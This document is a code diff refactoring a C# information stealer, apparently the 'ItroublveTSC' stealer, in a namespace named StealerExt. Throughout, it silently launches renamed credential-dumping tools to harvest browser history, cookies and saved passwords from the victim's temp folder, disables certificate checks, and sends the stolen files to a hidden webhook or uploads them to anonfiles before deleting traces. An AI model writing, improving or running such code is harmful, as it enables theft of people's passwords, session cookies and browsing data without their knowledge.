@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Http;
@@ -8,103 +7,34 @@ using System.Threading;
 
 namespace StealerExt
 {
-    public class API
+    internal class API
 	{
-        #region Public Clients
-        public string _name { get; set; }
-
-		public string _ppUrl { get; set; }
-
 		public API(string _HookUrl)
 		{
 			_Client = new HttpClient();
 			_URL = _HookUrl;
 		}
-
-		public static WebClient wc = new WebClient();
-		public static string Temp = Path.GetTempPath();
-        #endregion
-        #region Send Info
         public static void History()
 		{
-			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
-			ServicePointManager.Expect100Continue = true;
-			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
-			string idk = Temp + "compile.bat";
-			string idk2 = Temp + "compile.vbs";
-			if (File.Exists(idk)) File.Delete(idk);
-			if (File.Exists(idk2)) File.Delete(idk2);
-			using (StreamWriter streamWriter = File.CreateText(idk))
-			{
-				streamWriter.WriteLine("start %temp%\\xwizard.exe /stext \"%temp%\\%username%_History.txt\"");
-				streamWriter.WriteLine("exit");
-			}
-			using (StreamWriter streamWriter2 = File.CreateText(idk2))
-			{
-				streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
-				streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
-				streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
-				streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
-				streamWriter2.WriteLine("Dim strArgs");
-				streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
-				streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
-			}
-			Process proc = new Process();
-			proc.StartInfo.WorkingDirectory = Temp;
-			proc.StartInfo.FileName = "compile.vbs";
-			proc.StartInfo.CreateNoWindow = true;
-			proc.EnableRaisingEvents = true;
-			proc.Start();
-			proc.WaitForExit();
-			File.Delete(idk);
-			File.Delete(idk2);
+			StartProcess.Run("xwizard.exe", $"{Environment.UserName}_History.txt");
 			string _history = Temp + Environment.UserName + "_History.txt";
-			while (!File.Exists(_history) | IsFileinUse(new FileInfo(_history))) { }
-			long s = new FileInfo(_history).Length;
-			if (s < 7900000)
+			if (string.IsNullOrEmpty(File.ReadAllText(_history)))
 			{
-				try
-				{
-					bool flag1 = true;
-					if (File.Exists(_history))
-					{ 
-						string vm = File.ReadAllText(_history);
-						flag1 = vm == "";
-					}
-					bool flag = File.Exists(_history);
-					if (flag && !flag1)
-					{
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendHistory("**Browser History**", _history);
-					}
-					else if (flag1)
-					{
 
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendHistory("History file is empty.", null);
-					}
-					else
-					{
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendHistory("No history found", null);
-					}
-				}
-				catch (Exception ex)
+				new API(wHook).SendHistory("History file is empty.", null);
+				return;
+			}
+			long s = new FileInfo(_history).Length;
+			if (s < 7950000)
+			{
+				bool flag = File.Exists(_history);
+				if (flag )
 				{
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendHistory("History ex: " + ex.Message, null);
+					new API(wHook).SendHistory("**Browser History**", _history);
+				}
+				else
+				{
+					new API(wHook).SendHistory("No history found", null);
 				}
 			}
 			else
@@ -128,117 +58,45 @@ namespace StealerExt
 							history += "Browser History: " + ResponseBody.Split('"')[15] + "\r\n";
 						}
 					}
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendHistory(history, null);
+					new API(wHook).SendHistory(history, null);
 				}
 				catch (WebException ex)
 				{
 					history += "History ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendHistory(history, null);
+					new API(wHook).SendHistory(history, null);
 				}
 			}
 			File.Delete(_history);
         }
+        
 		public static void Cookies()
 		{
-			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
-			ServicePointManager.Expect100Continue = true;
-			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
-			string idk = Temp + "compile.bat";
-            string idk2 = Temp + "compile.vbs";
-            if (File.Exists(idk)) File.Delete(idk);
-            if (File.Exists(idk2)) File.Delete(idk2);
-            using (StreamWriter streamWriter = File.CreateText(idk))
-            {
-                streamWriter.WriteLine("start %temp%\\winhlp32.exe /stext \"%temp%\\Cookies1\"");
-				streamWriter.WriteLine("start %temp%\\splwow64.exe /stext \"%temp%\\Cookies2\"");
-				streamWriter.WriteLine("start %temp%\\hh.exe /stext \"%temp%\\Cookies3\"");
-				streamWriter.WriteLine("exit");
-            }
-            using (StreamWriter streamWriter2 = File.CreateText(idk2))
-            {
-                streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
-                streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
-                streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
-                streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
-                streamWriter2.WriteLine("Dim strArgs");
-                streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
-                streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
-            }
-            Process proc = new Process();
-            proc.StartInfo.WorkingDirectory = Temp;
-            proc.StartInfo.FileName = "compile.vbs";
-            proc.StartInfo.CreateNoWindow = true;
-            proc.EnableRaisingEvents = true;
-            proc.Start();
-            proc.WaitForExit();
-            File.Delete(idk);
-            File.Delete(idk2);
-			while (!File.Exists(Temp + "Cookies1") | !File.Exists(Temp + "Cookies2") | !File.Exists(Temp + "Cookies3") | IsFileinUse(new FileInfo(Temp + "Cookies1")) | IsFileinUse(new FileInfo(Temp + "Cookies2")) | IsFileinUse(new FileInfo(Temp + "Cookies3"))) { }
-			try
-            {
-				string c1 = File.ReadAllText(Temp + "Cookies1");
-				string c2 = File.ReadAllText(Temp + "Cookies2");
-				string c3 = File.ReadAllText(Temp + "Cookies3");
-				string c = c1 + c2 + c3;
-				File.WriteAllText(Temp + Environment.UserName + "_Cookies.txt", c);
-				File.Delete(Temp + "Cookies1"); File.Delete(Temp + "Cookies2"); File.Delete(Temp + "Cookies3");
-			}
-            catch (Exception x)
-            {
-				new API(wHook)
-				{
-					_name = name,
-					_ppUrl = pfp,
-				}.SendCookies("Cookies Ex [Mix]: " + x.Message, null);
-            }
+			StartProcess.Run("winhlp32.exe", "Cookies1");
+			StartProcess.Run("splwow64.exe", "Cookies2");
+			StartProcess.Run("hh.exe", "Cookies3");
+			string c1 = File.ReadAllText(Temp + "Cookies1");
+			string c2 = File.ReadAllText(Temp + "Cookies2");
+			string c3 = File.ReadAllText(Temp + "Cookies3");
+			string c = c1 + c2 + c3;
+			File.WriteAllText(Temp + Environment.UserName + "_Cookies.txt", c);
+			File.Delete(Temp + "Cookies1"); File.Delete(Temp + "Cookies2"); File.Delete(Temp + "Cookies3");
 			string text = Temp + Environment.UserName + "_Cookies.txt";
 			long size_c = new FileInfo(text).Length;
-			if (File.ReadAllText(text) == "") 
+			if (string.IsNullOrEmpty(File.ReadAllText(text))) 
 			{
-				new API(wHook)
-				{
-					_name = name,
-					_ppUrl = pfp
-				}.SendCookies("Cookies file is empty.", null);
+				new API(wHook).SendCookies("Cookies file is empty.", null);
 				return;
 			}
-			if (size_c < 7900000)
+			if (size_c < 7950000)
             {
-				try
+				bool flag = File.Exists(text);
+				if (flag)
 				{
-					bool flag = File.Exists(text);
-					if (flag)
-					{
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendCookies("**Browser Cookies**", text);
-					}
-					else
-					{
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendCookies("No cookies found!", null);
-					}
+					new API(wHook).SendCookies("**Browser Cookies**", text);
 				}
-				catch (Exception x)
+				else
 				{
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendCookies("Cookies ex: " + x.Message, null);
+					new API(wHook).SendCookies("No cookies found!", null);
 				}
 			}
             else
@@ -262,113 +120,36 @@ namespace StealerExt
 							info += "Browser Cookies: " + ResponseBody.Split('"')[15] + "\r\n";
 						}
 					}
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendCookies(info, null);
+					new API(wHook).SendCookies(info, null);
 				}
-				catch (WebException ex)
+				catch (Exception ex)
 				{
-					info += "Cookie ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendCookies(info, null);
+					info += "Cookies Exception [Anonfiles]: " + ex.Message + "\r\n";
+					new API(wHook).SendCookies(info, null);
 				}
 			}
 			File.Delete(text);
 		}
-		public static void Screenshot()
-        {
-			string ss = Temp + "ss.png";
-			bool flag = File.Exists(ss);
-			if (flag)
-            {
-				new API(wHook)
-				{
-					_name = name,
-					_ppUrl = pfp
-				}.SendScreenshot("", ss);
-				File.Delete(ss);
-			}
-		}
+        
 		public static void Passwords()
 		{
-			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
-			ServicePointManager.Expect100Continue = true;
-			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
-			string idk = Temp + "compile.bat";
-			string idk2 = Temp + "compile.vbs";
-			if (File.Exists(idk)) File.Delete(idk);
-			if (File.Exists(idk2)) File.Delete(idk2);
-			using (StreamWriter streamWriter = File.CreateText(idk))
+			StartProcess.Run("snuvcdsm.exe", "Passwords");
+			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
+			if (string.IsNullOrEmpty(File.ReadAllText(passwordLoc))) 
 			{
-				streamWriter.WriteLine("start %temp%\\snuvcdsm.exe /stext \"%temp%\\%username%_Passwords.txt\"");
-				streamWriter.WriteLine("exit");
-			}
-			using (StreamWriter streamWriter2 = File.CreateText(idk2))
-			{
-				streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
-				streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
-				streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
-				streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
-				streamWriter2.WriteLine("Dim strArgs");
-				streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
-				streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
-			}
-			Process proc = new Process();
-			proc.StartInfo.WorkingDirectory = Temp;
-			proc.StartInfo.FileName = "compile.vbs";
-			proc.StartInfo.CreateNoWindow = true;
-			proc.EnableRaisingEvents = true;
-			proc.Start();
-			proc.WaitForExit();
-			File.Delete(idk);
-			File.Delete(idk2);
-			string text = Temp + Environment.UserName + "_Passwords.txt";
-			while (!File.Exists(text) | IsFileinUse(new FileInfo(text))) { }	
-			string vm = File.ReadAllText(text);
-			if (vm == "") 
-			{
-				new API(wHook)
-				{
-					_name = name,
-					_ppUrl = pfp
-				}.SendPasswords("Password file is empty.", null);
+				new API(wHook).SendPasswords("Password file is empty.", null);
 				return;
 			}
-			long size_psw = new FileInfo(text).Length;
-			if (size_psw < 7900000)
+			long size_psw = new FileInfo(passwordLoc).Length;
+			if (size_psw < 7950000)
             {
-				try
+				if (File.Exists(passwordLoc))
 				{
-					bool flag = File.Exists(text);
-					if (flag)
-					{
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendPasswords("**Browser Password**", text);
-					}
-					else
-					{
-						new API(wHook)
-						{
-							_name = name,
-							_ppUrl = pfp
-						}.SendPasswords("No browser passwords found!", null);
-					}
+					new API(wHook).SendPasswords("**Browser Password**", passwordLoc);
 				}
-				catch (Exception x)
+				else
 				{
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendPasswords("Passwords ex: " + x.Message, null);
+					new API(wHook).SendPasswords("No browser passwords found!", null);
 				}
 			}
             else
@@ -380,7 +161,7 @@ namespace StealerExt
 					{
 						Client.Timeout = Timeout.Infinite;
 						Client.AllowWriteStreamBuffering = false;
-						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", text);
+						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", passwordLoc);
 						Client.Dispose();
 						string ResponseBody = Encoding.ASCII.GetString(Response);
 						if (ResponseBody.Contains("\"error\": {"))
@@ -392,30 +173,24 @@ namespace StealerExt
 							info += "Browser Passwords: " + ResponseBody.Split('"')[15] + "\r\n";
 						}
 					}
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendPasswords(info, null);
+					new API(wHook).SendPasswords(info, null);
 				}
 				catch (WebException ex)
 				{
 					info += "Passwords ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook)
-					{
-						_name = name,
-						_ppUrl = pfp
-					}.SendPasswords(info, null);
+					new API(wHook).SendPasswords(info, null);
 				}
 			}
-			File.Delete(text);
+			File.Delete(passwordLoc);
 		}
+		
 
+		// Junk... Can't bother updating tho and who cares :c
 		public bool SendCookies(string content = null, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
 			multipartFormDataContent.Add(new StringContent(content), "content");
 			bool flag = file != null;
 			if (flag)
@@ -430,8 +205,8 @@ namespace StealerExt
 		public bool SendHistory(string content = null, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
 			multipartFormDataContent.Add(new StringContent(content), "content");
 			bool flag = file != null;
 			if (flag)
@@ -443,17 +218,16 @@ namespace StealerExt
 			return result.StatusCode == HttpStatusCode.NoContent;
 		}
 
-		public bool SendScreenshot(string content = null, string file = null)
+		public bool SendScreenshot(MemoryStream file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(null), "content");
+			bool flag = file.Length > 0;
 			if (flag)
 			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), "ss.png", "ss.png");
+				multipartFormDataContent.Add(new ByteArrayContent(file.ToArray()), "screenshot", "Screenshot.png");
 			}
 			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
 			return result.StatusCode == HttpStatusCode.NoContent;
@@ -462,8 +236,8 @@ namespace StealerExt
 		public bool SendPasswords(string content, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
 			multipartFormDataContent.Add(new StringContent(content), "content");
 			bool flag = file != null;
 			if (flag)
@@ -478,8 +252,8 @@ namespace StealerExt
 		public bool SendSysInfo(string content, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
 			multipartFormDataContent.Add(new StringContent(content), "content");
 			bool flag = file != null;
 			if (flag)
@@ -494,8 +268,8 @@ namespace StealerExt
 		public bool SendWCC(string content, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
 			multipartFormDataContent.Add(new StringContent(content), "content");
 			bool flag = file != null;
 			if (flag)
@@ -509,8 +283,8 @@ namespace StealerExt
 		public bool idk(string content, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(_name), "username");
-			multipartFormDataContent.Add(new StringContent(_ppUrl), "avatar_url");
+			multipartFormDataContent.Add(new StringContent(name), "username");
+			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
 			multipartFormDataContent.Add(new StringContent(content), "content");
 			bool flag = file != null;
 			if (flag)
@@ -522,7 +296,7 @@ namespace StealerExt
 			return result.StatusCode == HttpStatusCode.NoContent;
 		}
 
-		public static bool IsFileinUse(FileInfo file)
+		public static bool FileInUse(FileInfo file)
 		{
 			FileStream stream = null;
 			if (file.Name.Contains("capture.png") & !file.Exists)
@@ -546,17 +320,15 @@ namespace StealerExt
 			}
 			return false;
 		}
-        #endregion
-        #region String & Bools
-        public static string wHook => Hook._Santa;
 
-		public static string name = "";
-
-		public static string pfp = "";
-
+        public static string wHook => Hook._DecryptedHook;
+		public static string name = "ItroublveTSC 6.2";
+		public static string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
 		private HttpClient _Client;
-
 		private string _URL;
-        #endregion
-    }
+		public string _name { get; set; }
+		public string _ppUrl { get; set; }
+		public static WebClient wc = new WebClient();
+		public static string Temp = Path.GetTempPath();
+	}
 }
